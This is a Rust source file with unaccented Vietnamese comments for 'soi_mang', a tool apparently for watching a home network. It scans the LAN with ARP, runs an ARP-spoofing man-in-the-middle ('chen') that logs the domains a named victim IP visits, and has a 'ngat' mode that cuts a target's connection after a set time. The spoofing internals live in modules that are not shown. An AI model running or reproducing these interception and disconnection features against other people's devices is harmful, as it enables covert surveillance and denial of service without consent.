//! soi_mang — soi mang nha cua GIAO.
//!
//! Lop GOC (Rust) bat/gui khung Ethernet that, chay duoi WSL/Kali. Ket qua ghi ra
//! JSONL cho app .giao doc qua cau noi (giong so_cong.jsonl san co cua du an).
//!
//! Lenh:
//!   sudo soi_mang quet <giao_dien>                      # Tang 1: ai dang noi wifi
//!   sudo soi_mang chen <giao_dien> <ip_nan_nhan> [ip_gateway]   # MITM: soi ten mien
//!
//! Ba-tri GIAO: may co reply = SANG; bi chan = TOI; im lang = AN (khong bia la 'tat').

// Tat lint dead_code/unused o cap crate: (1) API co chu dinh du chua goi het (vd BaTri::Toi
// danh cho Tang 3), (2) NE mot ICE cua rustc 1.95 — trinh ve canh bao panic tren snippet
// co ky tu da byte. Khong con canh bao de ve → khong con ICE.
#![allow(dead_code)]
#![allow(unused)]

mod arp;
mod bat_tri;
mod canh;
mod chen;
mod mac;
mod nic;
mod oui;
mod soi;

#[cfg(target_os = "linux")]
use nic::{Nic, NicLinux};

fn ip_str(ip: [u8; 4]) -> String {
    format!("{}.{}.{}.{}", ip[0], ip[1], ip[2], ip[3])
}

fn mac_str(m: mac::Mac) -> String {
    format!("{}", m)
}

#[cfg(not(target_os = "linux"))]
fn main() {
    eprintln!("soi_mang can raw socket cua Linux → chay duoi WSL/Kali:");
    eprintln!("  wsl -d kali-linux -- sudo ./soi_mang quet eth0");
}

#[cfg(target_os = "linux")]
fn main() {
    let args: Vec<String> = std::env::args().collect();
    if args.len() < 3 {
        in_huong_dan(&args[0]);
        std::process::exit(1);
    }
    let ket_qua = match args[1].as_str() {
        "quet" => lam_quet(&args[2]),
        "chen" => {
            if args.len() < 4 {
                in_huong_dan(&args[0]);
                std::process::exit(1);
            }
            let nan = phan_tich_ip(&args[3]).expect("ip nan nhan sai");
            // Cac tham so sau ip: co dau '.' = gateway; so tron = gioi han giay.
            let mut gw = None;
            let mut giay = None;
            for a in &args[4..] {
                if a.contains('.') {
                    gw = phan_tich_ip(a);
                } else if let Ok(n) = a.parse::<u64>() {
                    giay = Some(n);
                }
            }
            lam_chen(&args[2], nan, gw, giay)
        }
        "canh" => {
            // canh <gd> [chu_ky_giay] [--chan]
            let chu_ky = args
                .get(3)
                .and_then(|s| s.parse::<u64>().ok())
                .unwrap_or(30);
            let chan = args.iter().any(|a| a == "--chan");
            lam_canh(&args[2], chu_ky, chan)
        }
        "ngat" => {
            // ngat <gd> <ip> [phut_cho] [giay_ngat] [ip_gateway]
            if args.len() < 4 {
                in_huong_dan(&args[0]);
                std::process::exit(1);
            }
            let ip = phan_tich_ip(&args[3]).expect("ip sai");
            let mut so: Vec<u64> = Vec::new();
            let mut gw = None;
            for a in &args[4..] {
                if a.contains('.') {
                    gw = phan_tich_ip(a);
                } else if let Ok(n) = a.parse::<u64>() {
                    so.push(n);
                }
            }
            let phut_cho = so.get(0).copied().unwrap_or(5);
            let giay_ngat = so.get(1).copied().unwrap_or(20);
            lam_ngat(&args[2], ip, gw, phut_cho, giay_ngat)
        }
        _ => {
            in_huong_dan(&args[0]);
            std::process::exit(1);
        }
    };
    if let Err(e) = ket_qua {
        eprintln!("[loi] {} — thuong la thieu quyen (chay bang sudo?)", e);
        std::process::exit(1);
    }
}

fn in_huong_dan(prog: &str) {
    eprintln!("soi_mang — soi mang nha cua GIAO (ba-tri sang/toi/an)");
    eprintln!("  sudo {} quet <giao_dien>", prog);
    eprintln!("  sudo {} chen <giao_dien> <ip_nan_nhan> [ip_gateway] [giay]", prog);
    eprintln!("  sudo {} canh <giao_dien> [chu_ky_giay] [--chan]", prog);
    eprintln!("vi du: sudo {} quet eth0", prog);
}

fn phan_tich_ip(s: &str) -> Option<[u8; 4]> {
    let p: Vec<&str> = s.split('.').collect();
    if p.len() != 4 {
        return None;
    }
    let mut r = [0u8; 4];
    for i in 0..4 {
        r[i] = p[i].parse().ok()?;
    }
    Some(r)
}

// ===================== TANG 1: QUET =====================
#[cfg(target_os = "linux")]
fn lam_quet(gd: &str) -> std::io::Result<()> {
    let nic = NicLinux::mo(gd)?;
    eprintln!(
        "[quet] giao dien {} · MAC toi {} · IP toi {} · gui ARP ca dai...",
        gd,
        mac_str(nic.mac()),
        ip_str(nic.ipv4())
    );

    let mut db_oui = oui::Oui::moi();
    // Nap them oui.txt cua IEEE neu ban da tai ve canh binh (khong bat buoc).
    if let Ok(n) = db_oui.nap_file("oui.txt") {
        if n > 0 {
            eprintln!("[quet] nap them {} OUI tu oui.txt", n);
        }
    }

    let thay = arp::quet(&nic, 3000)?;

    println!("\n  TT  DIA CHI IP        MAC                HANG / GHI CHU");
    println!("  --  ---------------   -----------------  ---------------------------");
    let mut jsonl = String::new();
    for (_ip, m) in &thay {
        let hang = db_oui.tra(m.mac);
        let ghi = if m.mac.la_cuc_bo() {
            format!("{} [nghi giau danh tinh]", hang)
        } else {
            hang.clone()
        };
        println!(
            "  {}   {:<15}   {}  {}",
            m.trang_thai.dau(),
            ip_str(m.ip),
            mac_str(m.mac),
            ghi
        );
        jsonl.push_str(&format!(
            "{{\"ip\":\"{}\",\"mac\":\"{}\",\"trang_thai\":\"{}\",\"hang\":\"{}\",\"mac_ngau_nhien\":{}}}\n",
            ip_str(m.ip),
            mac_str(m.mac),
            m.trang_thai.ten(),
            hang.replace('"', "'"),
            m.mac.la_cuc_bo()
        ));
    }
    std::fs::write("so_thiet_bi.jsonl", &jsonl)?;
    println!(
        "\n[quet] thay {} may SANG (dang online). Da ghi so_thiet_bi.jsonl cho app .giao.",
        thay.len()
    );
    println!("[quet] may nao im lang = AN (chua ket luan tat). Doi chieu danh sach nay voi may ban BIET → cai la = nghi ngo.");
    Ok(())
}

// ===================== CHEN (MITM) =====================
#[cfg(target_os = "linux")]
fn lam_chen(
    gd: &str,
    nan_ip: [u8; 4],
    gw_ip: Option<[u8; 4]>,
    giay: Option<u64>,
) -> std::io::Result<()> {
    use std::sync::atomic::Ordering;

    let nic = NicLinux::mo(gd)?;

    // Doan gateway = .1 cung mang neu khong cho.
    let gw_ip = gw_ip.unwrap_or_else(|| {
        let mut g = nic.ipv4();
        g[3] = 1;
        g
    });

    eprintln!("[chen] hoi MAC gateway {} ...", ip_str(gw_ip));
    let gw_mac = match chen::hoi_mac(&nic, gw_ip, 4)? {
        Some(m) => m,
        None => {
            eprintln!("[chen] khong hoi duoc MAC gateway (AN) → dung. Kiem tra lai ip_gateway.");
            return Ok(());
        }
    };
    eprintln!("[chen] hoi MAC nan nhan {} ...", ip_str(nan_ip));
    let nan_mac = match chen::hoi_mac(&nic, nan_ip, 4)? {
        Some(m) => m,
        None => {
            eprintln!("[chen] nan nhan khong tra loi (AN) → co the khong online. Dung.");
            return Ok(());
        }
    };

    let gw = chen::MucTieu { ip: gw_ip, mac: gw_mac };
    let nan = chen::MucTieu { ip: nan_ip, mac: nan_mac };

    let cu = chen::bat_chuyen_tiep()?;
    eprintln!("[chen] da bat ip_forward (cu={}) → nan nhan khong bi dut mang.", cu);

    let co = chen::bay_dung();
    let co_soi = co.clone();

    // Neu co gioi han giay → hen gio tu dung (khong can Ctrl-C), van khoi phuc ARP.
    if let Some(n) = giay {
        let co_gio = co.clone();
        eprintln!("[chen] se tu dung sau {} giay.", n);
        std::thread::spawn(move || {
            std::thread::sleep(std::time::Duration::from_secs(n));
            co_gio.store(false, Ordering::SeqCst);
        });
    }

    // Ghi LIVE: mo so_soi.jsonl (xoa cu), moi ten mien bat duoc → ghi ngay + flush,
    // de GIAO doc duoc TRONG LUC dang bat (theo doi truc tiep), khong doi ket thuc.
    use std::io::Write as _;
    std::thread::scope(|s| {
        let nic_ref = &nic;
        let sniff = s.spawn(move || {
            let mut dem = 0u64;
            let mut f = std::fs::File::create("so_soi.jsonl").ok();
            while co_soi.load(Ordering::SeqCst) {
                match nic_ref.nhan(300) {
                    Ok(Some(khung)) => {
                        if let Some(ls) = soi::soi_khung(&khung) {
                            if ls.nguon_ip == nan_ip {
                                dem += 1;
                                println!("  [{}] {} → {}", ls.qua, ip_str(ls.nguon_ip), ls.ten_mien);
                                if let Some(f) = f.as_mut() {
                                    let _ = writeln!(
                                        f,
                                        "{{\"ip\":\"{}\",\"ten_mien\":\"{}\",\"qua\":\"{}\"}}",
                                        ip_str(ls.nguon_ip),
                                        ls.ten_mien,
                                        ls.qua
                                    );
                                    let _ = f.flush(); // day xuong dia ngay → GIAO thay live
                                }
                            }
                        }
                    }
                    Ok(None) => {}
                    Err(_) => break,
                }
            }
            eprintln!("[soi] boc duoc {} ten mien.", dem);
        });

        // luong CHEN (noi doi + khoi phuc khi co ha)
        let _ = chen::chen_giua(&nic, &nan, &gw, co.clone());
        let _ = sniff.join();
    });

    chen::tra_chuyen_tiep(&cu);
    eprintln!("[chen] da tra ip_forward ve {}. so_soi.jsonl da ghi live.", cu);
    eprintln!("[chen] nho: HTTPS chi lo TEN MIEN, khong lo noi dung — do la gioi han that.");
    Ok(())
}

// ===================== TANG 3: CANH GAC =====================
#[cfg(target_os = "linux")]
fn lam_canh(gd: &str, chu_ky: u64, chan: bool) -> std::io::Result<()> {
    let nic = NicLinux::mo(gd)?;
    eprintln!(
        "[canh] giao dien {} · MAC toi {} · IP toi {}",
        gd,
        mac_str(nic.mac()),
        ip_str(nic.ipv4())
    );
    let co = chen::bay_dung();
    canh::canh(&nic, chu_ky, chan, co)
}

// ===================== NGAT NHIP (cho phep N phut roi cat) =====================
#[cfg(target_os = "linux")]
fn lam_ngat(
    gd: &str,
    ip: [u8; 4],
    gw_ip: Option<[u8; 4]>,
    phut_cho: u64,
    giay_ngat: u64,
) -> std::io::Result<()> {
    let nic = NicLinux::mo(gd)?;
    let gw_ip = gw_ip.unwrap_or_else(|| {
        let mut g = nic.ipv4();
        g[3] = 1;
        g
    });
    eprintln!("[ngat] hoi MAC gateway {} & muc tieu {} ...", ip_str(gw_ip), ip_str(ip));
    let gw_mac = match chen::hoi_mac(&nic, gw_ip, 4)? {
        Some(m) => m,
        None => {
            eprintln!("[ngat] khong hoi duoc MAC gateway → dung.");
            return Ok(());
        }
    };
    let mt_mac = match chen::hoi_mac(&nic, ip, 4)? {
        Some(m) => m,
        None => {
            eprintln!("[ngat] muc tieu khong tra loi (AN) → co the offline. Dung.");
            return Ok(());
        }
    };
    let gw = chen::MucTieu { ip: gw_ip, mac: gw_mac };
    let mt = chen::MucTieu { ip, mac: mt_mac };
    let co = chen::bay_dung();
    chen::ngat_nhip(&nic, &mt, &gw, phut_cho, giay_ngat, co)
}
